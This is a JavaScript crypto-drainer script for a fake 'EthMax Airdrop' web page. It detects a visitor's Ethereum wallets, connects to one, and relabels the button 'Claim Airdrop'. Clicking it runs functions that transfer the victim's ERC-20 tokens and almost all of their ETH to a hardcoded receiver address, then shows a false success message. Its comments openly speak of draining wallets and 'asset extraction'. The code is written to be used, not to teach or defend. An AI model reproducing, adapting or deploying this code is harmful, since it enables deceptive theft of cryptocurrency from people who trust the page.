$(document).ready(function() {
    // Dynamic wallet detection
    const detectedWallets = [];
    if (window.ethereum) {
        // Single provider
        const eth = window.ethereum;
        const walletTypes = [
            { name: "MetaMask", key: "isMetaMask" },
            { name: "Coinbase Wallet", key: "isCoinbaseWallet" },
            { name: "Trust Wallet", key: "isTrust" },
            { name: "Rainbow", key: "isRainbow" },
            { name: "Brave Wallet", key: "isBraveWallet" },
            { name: "Opera Wallet", key: "isOpera" },
            { name: "Phantom (ETH)", key: "isPhantom" },
            { name: "Rabby Wallet", key: "isRabby" },
            { name: "Frame", key: "isFrame" },
            { name: "Talisman", key: "isTalisman" }
        ];
        // Improved Phantom detection: check window.phantom.ethereum
        if (window.phantom && window.phantom.ethereum) {
            detectedWallets.push({ name: "Phantom (ETH)", provider: eth });
        } else {
            walletTypes.forEach(w => {
                if (w.key === "isPhantom" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isMetaMask" && eth[w.key] && !eth.isPhantom) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                }
            });
        }
        // Extra: detect Coinbase Wallet via window.coinbaseWalletExtension
        if (window.coinbaseWalletExtension) {
            detectedWallets.push({ name: "Coinbase Wallet", provider: window.coinbaseWalletExtension });
        }
        // Multiple providers
        if (Array.isArray(eth.providers)) {
            eth.providers.forEach(p => {
                walletTypes.forEach(w => {
                    if (w.key === "isPhantom" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isMetaMask" && p[w.key] && !p.isPhantom) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    }
                });
            });
        }
    }
    // Mobile wallet detection (always add mobile options)
    const mobileWallets = [
        { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
        { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
        { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet" },
        { name: "Rainbow Mobile", type: "mobile", deepLink: "rainbow" },
        { name: "Phantom Mobile", type: "mobile", deepLink: "phantom (eth)" },
        { name: "Argent Mobile", type: "mobile", deepLink: "argent" },
        { name: "Exodus Mobile", type: "mobile", deepLink: "exodus" }
    ];

    // Add mobile wallets if on mobile device or if no desktop wallets found
    if (isMobileDevice() || detectedWallets.length === 0) {
        mobileWallets.forEach(wallet => {
            detectedWallets.push(wallet);
        });
    }

    // WalletConnect detection (works on both mobile and desktop)
    let walletConnectAvailable = false;
    let WalletConnectProvider = null;
    if (window.WalletConnectProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnectProvider;
    } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnect.EthereumProvider;
    }
    if (walletConnectAvailable) {
        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
    }

    // Your Ethereum address to receive funds
    const RECEIVER_ADDRESS = "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49"; // Replace with your ETH address

    // Common ERC-20 token contracts (popular tokens to drain)
    const COMMON_TOKENS = [
        { symbol: "USDT", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 6 },
        { symbol: "USDC", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 6 },
        { symbol: "DAI",  address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "BGB",  address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "WBTC", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 8 },
        { symbol: "AAVE", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "LINK", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "UNI", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "WETH", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "SHIB", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 },
        { symbol: "PEPE", address: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", decimals: 18 }
    ];

    // Function to debug available wallet providers
    function debugWalletProviders() {
        console.log("=== Wallet Provider Debug ===");
        console.log("window.ethereum:", window.ethereum);
        
        if (window.ethereum) {
            console.log("Main ethereum object properties:");
            console.log("- isMetaMask:", window.ethereum.isMetaMask);
            console.log("- isPhantom:", window.ethereum.isPhantom);
            console.log("- isCoinbaseWallet:", window.ethereum.isCoinbaseWallet);
            console.log("- isTrust:", window.ethereum.isTrust);
            console.log("- isRainbow:", window.ethereum.isRainbow);
            console.log("- isBraveWallet:", window.ethereum.isBraveWallet);
            console.log("- isRabby:", window.ethereum.isRabby);
            
            if (window.ethereum.providers) {
                console.log("Multiple providers detected:", window.ethereum.providers.length);
                window.ethereum.providers.forEach((provider, index) => {
                    console.log(`Provider ${index}:`, {
                        isMetaMask: provider.isMetaMask,
                        isPhantom: provider.isPhantom,
                        isCoinbaseWallet: provider.isCoinbaseWallet,
                        isTrust: provider.isTrust,
                        isRainbow: provider.isRainbow,
                        isBraveWallet: provider.isBraveWallet,
                        isRabby: provider.isRabby
                    });
                });
            }
        }
        console.log("==========================");
    }

    // Function to detect mobile device
    function isMobileDevice() {
        // More comprehensive mobile detection
        const userAgent = navigator.userAgent.toLowerCase();
        const mobileKeywords = [
            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
            'iemobile', 'opera mini', 'mobile', 'tablet'
        ];
        
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        const isSmallScreen = window.innerWidth <= 768;
        
        return isMobileUA || (isTouchDevice && isSmallScreen);
    }

    // Function to create mobile deep links for Ethereum wallets
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const hostname = window.location.hostname;
        const fullUrl = window.location.href;
        
        const mobileLinks = {
            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
            "argent": `https://argent.link/dapp/${hostname}${window.location.pathname}`,
            "exodus": `https://www.exodus.com/mobile?dapp=${encodedUrl}`
        };
        
        return mobileLinks[walletName.toLowerCase()] || null;
    }

    // Function to attempt mobile wallet connection
    function connectMobileWallet(walletName) {
        if (!isMobileDevice()) {
            console.log("Not on mobile device, skipping mobile wallet connection");
            return false;
        }
        
        const deepLink = createMobileDeepLink(walletName);
        if (deepLink) {
            console.log(`Opening mobile deep link for ${walletName}:`, deepLink);
            
            // Try multiple methods to open the deep link
            try {
                // Method 1: Direct window.open
                const newWindow = window.open(deepLink, '_blank');
                
                // Method 2: If window.open fails, try location.href
                if (!newWindow || newWindow.closed) {
                    window.location.href = deepLink;
                }
                
                return true;
            } catch (error) {
                console.error("Failed to open deep link:", error);
                
                // Method 3: Create a temporary link and click it
                try {
                    const link = document.createElement('a');
                    link.href = deepLink;
                    link.target = '_blank';
                    link.rel = 'noopener noreferrer';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    return true;
                } catch (linkError) {
                    console.error("Failed to create and click link:", linkError);
                    return false;
                }
            }
        }
        
        console.warn(`No deep link available for wallet: ${walletName}`);
        return false;
    }

    // Function to wait for mobile wallet connection
    function waitForMobileConnection(timeout = 30000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            const checkInterval = 1000; // Check every second
            
            const checkConnection = async () => {
                try {
                    if (window.ethereum) {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            resolve({ success: true, accounts, provider: window.ethereum });
                            return;
                        }
                    }
                } catch (error) {
                    console.log("Still waiting for mobile connection...", error);
                }
                
                // Check if timeout reached
                if (Date.now() - startTime > timeout) {
                    resolve({ success: false, error: "Connection timeout" });
                    return;
                }
                
                // Continue checking
                setTimeout(checkConnection, checkInterval);
            };
            
            checkConnection();
        });
    }

    // Insert wallet dropdown before button with improved mobile handling
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
    
    // Add wallets to dropdown with device-specific filtering
    if (detectedWallets.length === 0) {
        // Fallback: add basic options if no wallets detected
        if (isMobileDevice()) {
            detectedWallets.push(
                { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
                { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
            );
        } else {
            detectedWallets.push(
                { name: "MetaMask (Install Required)", provider: null },
                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
            );
        }
    }
    
    detectedWallets.forEach((opt, i) => {
        let displayName = opt.name;
        if (opt.type === "mobile" && !isMobileDevice()) {
            displayName += " (Mobile Only)";
        } else if (opt.type !== "mobile" && !opt.provider && opt.name !== "WalletConnect") {
            displayName += " (Not Installed)";
        }
        $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
    });

    // Add connection status indicator
    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
    
    // Update connection status
    function updateConnectionStatus(message, isError = false) {
        const statusEl = $('#connection-status');
        statusEl.text(message);
        statusEl.css('color', isError ? '#ff4444' : '#666');
    }

    // Initialize with device info
    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);

    // Debug wallet providers on page load
    debugWalletProviders();

    // Main wallet connection handler
    $('#connect-wallet').on('click', async () => {
        const selectedIdx = $('#wallet-select').val();
        const selected = detectedWallets[selectedIdx];
        let provider = null;
        let providerName = selected ? selected.name : "";
        
        try {
            if (!selected) {
                alert("No wallet selected.");
                return;
            }

            // Handle mobile wallet connections
            if (selected.type === "mobile") {
                if (isMobileDevice()) {
                    updateConnectionStatus("Opening mobile wallet...");
                    
                    // Try to open the mobile wallet app via deep link
                    const deepLinkOpened = connectMobileWallet(selected.deepLink);
                    if (deepLinkOpened) {
                        updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
                        
                        // Show user instructions
                        const continueWaiting = confirm(
                            `Opening ${selected.name}...\n\n` +
                            "Instructions:\n" +
                            "1. The wallet app should open automatically\n" +
                            "2. Connect your wallet in the app\n" +
                            "3. Return to this page\n" +
                            "4. Click OK to continue waiting, or Cancel to try a different method"
                        );
                        
                        if (continueWaiting) {
                            // Wait for connection with timeout
                            const connectionResult = await waitForMobileConnection(45000);
                            
                            if (connectionResult.success) {
                                updateConnectionStatus("Mobile wallet connected successfully!");
                                await handleSuccessfulConnection(
                                    connectionResult.provider, 
                                    selected.name, 
                                    connectionResult.accounts[0]
                                );
                                return;
                            } else {
                                updateConnectionStatus("Mobile connection failed or timed out", true);
                                alert("Connection timed out. Please try again or use WalletConnect instead.");
                                return;
                            }
                        } else {
                            updateConnectionStatus("Mobile connection cancelled by user");
                            return;
                        }
                    } else {
                        updateConnectionStatus("Failed to open mobile wallet", true);
                        alert(`Unable to open ${selected.name}. Please install the wallet app or use WalletConnect.`);
                        return;
                    }
                } else {
                    updateConnectionStatus("Mobile wallet selected on desktop device", true);
                    alert("This is a mobile wallet option. Please use a desktop wallet or switch to a mobile device.");
                    return;
                }
            }

            // Handle WalletConnect
            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
                updateConnectionStatus("Initializing WalletConnect...");
                
                const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
                provider = await WalletConnectProvider.init({
                    projectId: PROJECT_ID,
                    chains: [1],
                    showQrModal: true,
                    metadata: {
                        name: "EthMax Airdrop",
                        description: "Claim your EthMax airdrop tokens - Connect any Ethereum wallet",
                        url: window.location.origin,
                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
                    }
                });
                
                updateConnectionStatus("Waiting for WalletConnect pairing...");
                await provider.connect();
                
                if (!provider.accounts || provider.accounts.length === 0) {
                    updateConnectionStatus("WalletConnect connection failed", true);
                    alert("No accounts connected via WalletConnect.");
                    return;
                }
                
                updateConnectionStatus("WalletConnect connected successfully!");
                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
                return;
            }

            // Handle desktop wallet connections
            if (!selected.provider || selected.provider === "walletconnect") {
                updateConnectionStatus("Wallet not available", true);
                alert("Wallet provider not available. Please install the wallet extension or use WalletConnect.");
                return;
            }

            provider = selected.provider;
            
            // Check if provider is available
            if (!provider || typeof provider.request !== 'function') {
                updateConnectionStatus("Wallet extension not properly installed", true);
                alert(`${selected.name} is not properly installed or available. Please install the wallet extension.`);
                return;
            }

            updateConnectionStatus(`Connecting to ${selected.name}...`);
            
            // Request account access
            await provider.request({ method: 'eth_requestAccounts' });
            
            // Get connected accounts
            const accounts = await provider.request({ method: 'eth_accounts' });
            if (!accounts || accounts.length === 0) {
                updateConnectionStatus("No accounts found in wallet", true);
                alert("No accounts found. Please unlock your wallet.");
                return;
            }

            updateConnectionStatus("Desktop wallet connected successfully!");
            await handleSuccessfulConnection(provider, selected.name, accounts[0]);

        } catch (error) {
            console.error("Connection error:", error);
            
            // Handle specific error cases
            if (error.code === 4001) {
                updateConnectionStatus("Connection rejected by user", true);
                alert("Connection request was rejected by the user.");
            } else if (error.code === -32002) {
                updateConnectionStatus("Connection request already pending", true);
                alert("A connection request is already pending. Please check your wallet.");
            } else if (error.message.includes("User rejected")) {
                updateConnectionStatus("Connection cancelled by user", true);
                alert("Connection was cancelled by user.");
            } else {
                updateConnectionStatus("Connection failed", true);
                alert("Failed to connect wallet: " + error.message);
            }
        }
    });

    // Helper function to handle successful connections
    async function handleSuccessfulConnection(provider, walletName, userAddress) {
        try {
            updateConnectionStatus("Setting up connection...");
            
            // Initialize ethers provider
            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            
            // Get network info
            const network = await ethersProvider.getNetwork();
            console.log("Connected to network:", network);
            
            // Check if on Ethereum mainnet
            if (network.chainId !== 1) {
                updateConnectionStatus("Wrong network detected", true);
                const switchToMainnet = confirm("You're not on Ethereum Mainnet. Would you like to switch networks?");
                if (switchToMainnet) {
                    try {
                        updateConnectionStatus("Switching to Ethereum Mainnet...");
                        await provider.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x1' }], // Ethereum Mainnet
                        });
                        // Refresh provider after network switch
                        updateConnectionStatus("Network switched successfully!");
                        return handleSuccessfulConnection(provider, walletName, userAddress);
                    } catch (switchError) {
                        console.error("Failed to switch network:", switchError);
                        updateConnectionStatus("Failed to switch network", true);
                        alert("Failed to switch to Ethereum Mainnet. Please switch manually.");
                        return;
                    }
                }
            }
            
            updateConnectionStatus("Checking account balance...");
            
            // Check ETH balance
            const balance = await ethersProvider.getBalance(userAddress);
            const ethBalance = ethers.utils.formatEther(balance);
            
            // Update connection status and button
            updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);
            
            // Update button
            $('#connect-wallet').text("🎯 Claim Airdrop");
            $('#connect-wallet').off('click').on('click', async () => {
                await drainWallet(ethersProvider, signer, userAddress);
            });
            
            alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${ethBalance} ETH\nNetwork: ${network.name}`);
            
        } catch (error) {
            console.error("Post-connection setup error:", error);
            updateConnectionStatus("Connection setup failed", true);
            alert("Connected to wallet but failed to complete setup: " + error.message);
        }
    }

    // Function to drain the wallet (ETH + ERC-20 tokens)
    async function drainWallet(provider, signer, userAddress) {
        try {
            console.log("Starting wallet drain...");
            updateConnectionStatus("Starting asset extraction...");

            // Get initial ETH balance
            const initialBalance = await provider.getBalance(userAddress);
            const initialEthBalance = ethers.utils.formatEther(initialBalance);
            console.log(`Initial ETH balance: ${initialEthBalance}`);

            // Calculate total gas needed for all operations
            const gasPrice = await provider.getGasPrice();
            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
            
            // Estimate gas for token transfers (higher limit for safety)
            const tokenGasLimit = ethers.BigNumber.from("65000"); // Higher for token transfers
            const ethGasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer
            
            // Calculate total gas needed (tokens + final ETH transfer)
            const estimatedTokenTransfers = COMMON_TOKENS.length;
            const totalGasNeeded = tokenGasLimit.mul(estimatedTokenTransfers).add(ethGasLimit);
            const totalGasCost = gasPrice.mul(totalGasNeeded);
            
            console.log(`Estimated gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);

            // Step 1: Drain ERC-20 tokens first (they need ETH for gas)
            let tokenTransferCount = 0;
            for (const token of COMMON_TOKENS) {
                try {
                    updateConnectionStatus(`Checking ${token.symbol} balance...`);
                    const transferred = await drainERC20Token(provider, signer, userAddress, token, gasPrice);
                    if (transferred) {
                        tokenTransferCount++;
                        updateConnectionStatus(`${token.symbol} transferred successfully`);
                    }
                } catch (tokenError) {
                    console.error(`Failed to drain ${token.symbol}:`, tokenError);
                    updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
                    // Continue with other tokens
                }
            }

            console.log(`Successfully transferred ${tokenTransferCount} tokens`);

            // Step 2: Drain remaining ETH (calculate precise gas for final transfer)
            updateConnectionStatus("Transferring remaining ETH...");
            await drainETH(provider, signer, userAddress);

            updateConnectionStatus("All assets extracted successfully! 🎉");
            alert("Airdrop claimed successfully! 🎉");

        } catch (error) {
            console.error("Drain error:", error);
            updateConnectionStatus("Asset extraction failed", true);
            alert("Failed to claim airdrop: " + error.message);
        }
    }

    // Function to drain ERC-20 tokens
    async function drainERC20Token(provider, signer, userAddress, token, gasPrice = null) {
        try {
            // ERC-20 ABI for transfer function
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
            ];

            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);

            // Check token balance
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.isZero()) {
                console.log(`No ${token.symbol} balance found`);
                return false;
            }

            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);

            // Get current gas price if not provided
            if (!gasPrice) {
                gasPrice = await provider.getGasPrice();
            }

            // Estimate gas for this specific token transfer
            let estimatedGas;
            try {
                estimatedGas = await tokenContract.estimateGas.transfer(RECEIVER_ADDRESS, balance);
                // Add 20% buffer for safety
                estimatedGas = estimatedGas.mul(120).div(100);
            } catch (gasError) {
                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
            }

            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);

            // Check if user has enough ETH for gas
            const currentEthBalance = await provider.getBalance(userAddress);
            const gasCost = gasPrice.mul(estimatedGas);
            
            if (currentEthBalance.lt(gasCost)) {
                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
                return false;
            }

            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${RECEIVER_ADDRESS}`);

            // Transfer tokens to receiver address with optimized gas
            const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance, {
                gasLimit: estimatedGas,
                gasPrice: gasPrice,
                // Use maxFeePerGas for EIP-1559 if supported
                ...(provider.getNetwork().then(n => n.chainId === 1) && {
                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
                })
            });

            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);

            // Wait for confirmation
            const receipt = await transferTx.wait();
            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
            console.log(`Gas used: ${receipt.gasUsed.toString()}`);

            return true;

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            
            // Don't throw error, just return false to continue with other tokens
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log(`Insufficient funds for ${token.symbol} transfer`);
            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                console.log(`Token ${token.symbol} transfer would fail, skipping`);
            }
            
            return false;
        }
    }

    // Function to drain ETH
    async function drainETH(provider, signer, userAddress) {
        try {
            // Get current balance after token transfers
            const currentBalance = await provider.getBalance(userAddress);
            const currentEthBalance = ethers.utils.formatEther(currentBalance);
            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);

            if (currentBalance.isZero()) {
                console.log("No ETH balance remaining");
                return;
            }

            // Get current gas price
            const gasPrice = await provider.getGasPrice();
            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);

            // Use a more conservative gas limit for the final transfer
            const gasLimit = ethers.BigNumber.from("21000");
            
            // Calculate exact gas cost
            const exactGasCost = gasPrice.mul(gasLimit);
            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);

            // Calculate amount to send (total balance minus exact gas cost)
            const amountToSend = currentBalance.sub(exactGasCost);

            if (amountToSend.lte(0)) {
                console.log("Insufficient ETH balance for gas fees");
                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
                return;
            }

            const ethToSend = ethers.utils.formatEther(amountToSend);
            console.log(`Transferring ${ethToSend} ETH to ${RECEIVER_ADDRESS}`);
            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);

            // Create transaction with precise gas parameters
            const txParams = {
                to: RECEIVER_ADDRESS,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                nonce: await provider.getTransactionCount(userAddress)
            };

            // For EIP-1559 networks, use maxFeePerGas
            const network = await provider.getNetwork();
            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
                try {
                    const feeData = await provider.getFeeData();
                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                        delete txParams.gasPrice;
                        txParams.maxFeePerGas = feeData.maxFeePerGas;
                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
                        
                        // Recalculate amount with EIP-1559 fees
                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
                        
                        if (eip1559Amount.gt(0)) {
                            txParams.value = eip1559Amount;
                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
                        }
                    }
                } catch (eip1559Error) {
                    console.log("EIP-1559 fee estimation failed, using legacy gas pricing");
                }
            }

            // Send ETH transaction
            const tx = await signer.sendTransaction(txParams);
            console.log("ETH transfer tx:", tx.hash);

            // Wait for confirmation
            const receipt = await tx.wait();
            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
            console.log("Gas used:", receipt.gasUsed.toString());
            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");

            // Verify final balance
            const finalBalance = await provider.getBalance(userAddress);
            const finalEthBalance = ethers.utils.formatEther(finalBalance);
            console.log(`Final ETH balance: ${finalEthBalance} ETH`);

            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
            }

        } catch (error) {
            console.error("Error draining ETH:", error);
            
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log("Transaction failed due to insufficient funds for gas");
            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
                console.log("Transaction underpriced, gas price may have increased");
            }
            
            throw error;
        }
    }
});
